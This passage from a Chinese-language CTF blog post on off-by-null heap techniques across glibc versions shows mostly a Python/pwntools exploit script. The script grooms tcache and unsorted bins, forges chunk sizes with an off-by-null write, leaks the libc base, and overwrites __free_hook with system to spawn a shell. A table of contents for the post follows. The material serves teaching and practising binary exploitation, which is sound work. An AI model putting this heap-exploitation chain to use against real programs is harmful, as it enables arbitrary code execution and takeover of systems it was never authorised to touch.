class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有size限制，对应索引往后移即可</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>-<span class="number">0x290</span>+<span class="number">0x3000</span>-<span class="number">0x8</span>+<span class="number">0x3a0</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="comment">#old 			#new</span></span><br><span class="line"><span class="comment">#get layout to let chunk0_addr = 0x****3a0</span></span><br><span class="line">claim(<span class="number">0x88</span>)<span class="comment"># 0-6			#1-7</span></span><br><span class="line">claim(<span class="number">0x98</span>)<span class="comment"># 7-13			#8-14</span></span><br><span class="line">claim(<span class="number">0xa8</span>)<span class="comment"># 14-20			#15-21</span></span><br><span class="line">claim(<span class="number">0xb8</span>)<span class="comment"># 21-27			#22-28</span></span><br><span class="line">claim(<span class="number">0xc8</span>)<span class="comment"># 28-34			#29-35</span></span><br><span class="line">claim(<span class="number">0xd8</span>)<span class="comment"># 35-41			#36-42</span></span><br><span class="line">claim(<span class="number">0xe8</span>)<span class="comment"># 42-48			#43-49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 49 				#50</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 50 				#51		0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 51  				#52 	0x****f9a0</span></span><br><span class="line">add_malloc(<span class="number">0xa8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52     0 			#53		0x****f9c0</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     1 			#54		0x****fa70</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 54     2 			#55		0x****fb30</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 55     			#56		</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 56     3 			#57		0x****fcf0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的</span></span><br><span class="line">fakeChunk_nextChunk_preSize = p64(<span class="number">0x200</span>) + p64(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">57</span>,<span class="number">0x10</span>,fakeChunk_nextChunk_preSize)<span class="comment"># 56			#57</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 57    4 			#58 	0x****fde0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 58 				#59</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 59 				#60 	0x****ff70</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 60 				#61</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free 0~48 		#1~49</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):  <span class="comment">#0x88  	</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>,<span class="number">21</span>):<span class="comment">#0xa8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">42</span>):<span class="comment">#0xd8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>,<span class="number">57</span>): <span class="comment">#52~56  				#53~57  merge into unsortedbin</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment"># empty tcache</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#62~68</span></span><br><span class="line">claim(<span class="number">0xa8</span>) <span class="comment">#69~75</span></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#76~82</span></span><br><span class="line">claim(<span class="number">0xd8</span>) <span class="comment">#83~89</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#90~96</span></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------- 上面是一个大的unsorted bin</span></span><br><span class="line"><span class="comment">#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52 	#97  	#0x****9c0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     #98		#0x****A60</span></span><br><span class="line"></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span> * <span class="string">&quot;a&quot;</span> + p16(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1-&gt;0x200</span></span><br><span class="line"><span class="comment">#changing largebinChunk_size will not cause abort</span></span><br><span class="line">edit(<span class="number">98</span>,<span class="number">0x98</span>+<span class="number">0x2</span>,fake_chunk_size)<span class="comment">#53 #98</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#54 	#99 	#0x****B00</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#55  #100 	#0x****B90</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#56  #101 	#0x****C70</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造preChunk的fd和bk------------------------</span></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">51</span>)<span class="comment">#0x98 	#50  	#51 #0x****f900</span></span><br><span class="line"><span class="comment">#let 99-&gt;fd = chunk51_addr(0x****f900)</span></span><br><span class="line">free(<span class="number">99</span>)<span class="comment">#0x88  	#54 	#99</span></span><br><span class="line"><span class="comment">#let 99-&gt;bk = chunk60_addr(0x****ff70)</span></span><br><span class="line">free(<span class="number">60</span>)<span class="comment">#0xe8 	#59 	#60 #0x****ff70</span></span><br><span class="line"><span class="comment">#构造preChunk的fd和bk------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">98</span>)<span class="comment">#0x98 	#53 	#98</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#102~108</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#109~115</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#116~122</span></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块</span></span><br><span class="line"><span class="comment">#之后依据大小适配原则将60分配回来给123</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x32		#123 0x****ff70,实际大小为0xf0</span></span><br><span class="line"><span class="comment">#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x35  		#124 0x****fa60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块</span></span><br><span class="line">free(<span class="number">100</span>) 			<span class="comment">#55 	#100</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x88</span>)	<span class="comment">#125~131</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x36 	#132 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x37  	#133	0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3b 	#134 	0x****fbe0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修复FD-&gt;bk和BK-&gt;fd-----------------------------</span></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#let 133-&gt;bk = chunk132_addr(0x****f900-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">133</span>) <span class="comment">#0x37 	#133 	0x****f900</span></span><br><span class="line">free(<span class="number">132</span>) <span class="comment">#0x36  	#132 	0x****fb20</span></span><br><span class="line"><span class="comment">#let 123-&gt;fd = chunk132_addr(0x****ff70-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">123</span>) <span class="comment">#0x32 	#123  	0x****ff70</span></span><br><span class="line"><span class="comment">#修复FD-&gt;bk和BK-&gt;fd-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">59</span>)  <span class="comment">#58		#59		0x****fed0</span></span><br><span class="line"><span class="comment">#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x98</span>) 	<span class="comment">#135~141</span></span><br><span class="line">claim(<span class="number">0xb8</span>)		<span class="comment">#142~148</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#149~155</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x32 		#156 	0x****fed0	</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x36 		#157 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x37  		#158	0x****ffa0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#58  		#159 	0x****f900</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--top_chunk</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3d 			#160</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3e 			#161</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3f 			#162</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">161</span>) <span class="comment">#0x98 	#0x3e 		#161</span></span><br><span class="line">free(<span class="number">159</span>) <span class="comment">#0x98 	#58  		#159 	0x****f900</span></span><br><span class="line">free(<span class="number">157</span>) <span class="comment">#0xb8 	#0x36 		#157</span></span><br><span class="line">free(<span class="number">50</span>)  <span class="comment">#0x98 	#49 		#50 	0x****f860</span></span><br><span class="line"><span class="comment">#其中159和50合并为0x140大小的块放入unsortedbin中</span></span><br><span class="line"><span class="comment">#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#163~169</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#170~176</span></span><br><span class="line"><span class="comment">#----------------------------------------------------</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#49 	#177</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x36  	#178</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切割0x140的块</span></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3a 	#179 	0x****f860</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3e   	#180 	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0x98</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line">partial_null_write += p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">156</span>,<span class="number">0x98</span>+<span class="number">0x8</span>+<span class="number">0x1</span>,partial_null_write+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x32  	#156</span></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0xa8</span>*<span class="string">&#x27;c&#x27;</span></span><br><span class="line">edit(<span class="number">179</span>,<span class="number">0xa8</span>+<span class="number">0x1</span>,partial_null_write + <span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#0x3a 		#179</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造pre_size</span></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span>*<span class="string">&#x27;d&#x27;</span></span><br><span class="line">fake_chunk_size += p64(<span class="number">0x2e1</span>)</span><br><span class="line">edit(<span class="number">124</span>,<span class="number">0x98</span>+<span class="number">0x8</span>,fake_chunk_size) 	<span class="comment">#0x35 	#124</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line">free(<span class="number">58</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pull-down the unsortedbinChunk to chunk134 and leak main_arena</span></span><br><span class="line">edit(<span class="number">134</span>,<span class="number">0x8</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)  <span class="comment">#0x3b #134</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>) 	<span class="comment">#181</span></span><br><span class="line">show(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64Leakbase(unsortedBinIdx + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#182~188</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x40 	#189</span></span><br><span class="line">free(<span class="number">44</span>) 	<span class="comment">#0x2b 	#44</span></span><br><span class="line">free(<span class="number">134</span>) 	<span class="comment">#0x3b 	#134</span></span><br><span class="line">edit(<span class="number">189</span>,<span class="number">0x8</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>)) 	<span class="comment">#0x40 	#189</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)  		<span class="comment">#190</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#191</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">191</span>,<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])) 	<span class="comment">#191</span></span><br><span class="line">free(<span class="number">191</span>)</span><br><span class="line">it()</span><br><span class="line"><span class="comment">#--------------------------------------------------------------</span></span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/31/off-by-null%E6%80%BB%E7%BB%93/">http://pig-007.github.io/2021/08/31/off-by-null%E6%80%BB%E7%BB%93/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/off-by-null/">off-by-null</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/09/06/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E4%BA%8C)/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">pwnKernel从0开始(二)</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/20/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E5%90%84%E7%B1%BB%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"><span class="paginator-prev__text">高版本各类堆技巧总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">
          一、原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%B8%B8%E7%94%A8%E5%B8%83%E5%B1%80"><span class="toc-text">
          1.常用布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">
          2.注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%A1%BA%E5%BA%8F"><span class="toc-text">
          (1)顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-size%E4%BD%8D%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-text">
          (2)size位的设置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9B%B4%E6%96%B0%E6%8D%A2%E4%BB%A3"><span class="toc-text">
          二、更新换代</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Glibc2-27"><span class="toc-text">
          1.Glibc2.27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Glibc2-29"><span class="toc-text">
          2.Glibc2.29</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-int-free%E4%B8%AD%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-text">
          (1)_int_free中的变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-unlink%E5%8F%98%E5%8C%96"><span class="toc-text">
          (2)unlink变化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%AB%98%E7%89%88%E6%9C%AC%E8%8A%B1%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-text">
          三、高版本花式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-text">
          第一种</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-text">
          第二种</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D"><span class="toc-text">
          第三种</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E5%B8%83%E5%B1%80%EF%BC%9A"><span class="toc-text">
          (1)前置布局：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A1%AB%E5%85%85tcache"><span class="toc-text">
          (2)填充tcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E6%9E%845357%E7%BB%93%E6%9E%84%E4%B8%BA97101"><span class="toc-text">
          (3)重构5357结构为97101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%84%E9%80%A0preChunk%E7%9A%84fd%E5%92%8Cbk"><span class="toc-text">
          (4)构造preChunk的fd和bk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%8D%E9%87%8D%E6%9E%8497-101%E4%B8%BA97-gt-124-gt-132-gt-134"><span class="toc-text">
          (5)再重构97~101为97-&gt;124-&gt;132-&gt;134</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8DFD-gt-bk%E5%92%8CBK-gt-fd"><span class="toc-text">
          (6)修复FD-&gt;bk和BK-&gt;fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%86%8D%E9%87%8D%E6%9E%84%E4%B8%BA97-gt-124-gt-157-gt-134"><span class="toc-text">
          (7)再重构为97-&gt;124-&gt;157-&gt;134</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%88%A9%E7%94%A8off-by-null%E5%BE%97%E5%88%B0%E6%9C%80%E7%BB%88%E5%B8%83%E5%B1%80"><span class="toc-text">
          (8)利用off-by-null得到最终布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%A7%A6%E5%8F%91off-by-null"><span class="toc-text">
          (9)触发off-by-null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B2%E6%80%BB%E7%BB%93"><span class="toc-text">
